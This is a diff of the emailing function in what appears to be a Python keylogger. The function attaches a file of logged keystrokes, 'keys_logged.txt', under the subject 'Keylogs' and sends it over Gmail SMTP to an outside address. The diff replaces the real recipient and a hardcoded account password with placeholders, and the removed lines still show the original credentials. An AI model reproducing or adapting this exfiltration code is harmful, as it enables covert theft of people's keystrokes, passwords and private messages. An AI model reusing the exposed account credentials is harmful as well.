@@ -10,7 +10,7 @@ def new_emailer():
     msg = MIMEMultipart()
     msg['Subject'] = "Keylogs"
     msg['From'] = "botmailbot01@gmail.com"
-    msg['To'] = "go.gusfm@gmail.com"
+    msg['To'] = "send_to@email.com"
 
     part = MIMEBase('application', 'octet-stream')
     part.set_payload(open('keys_logged.txt', 'rb').read())
@@ -23,9 +23,9 @@ def new_emailer():
     server = smtplib.SMTP("smtp.gmail.com", 587)
     server.starttls()
     #Senhas e permissoes para o email que vai enviar as mensagens
-    server.login("botmailbot01@gmail.com","mailbot01")
+    server.login("botmailbot01@gmail.com","password")
     #Enviar o email
-    server.sendmail("botmailbot01@gmail.com", "go.gusfm@gmail.com", msg.as_string())
+    server.sendmail(msg['From'], msg['To'], msg.as_string())
     #Desconectar do servidor
     server.quit()
     print ("Sent")
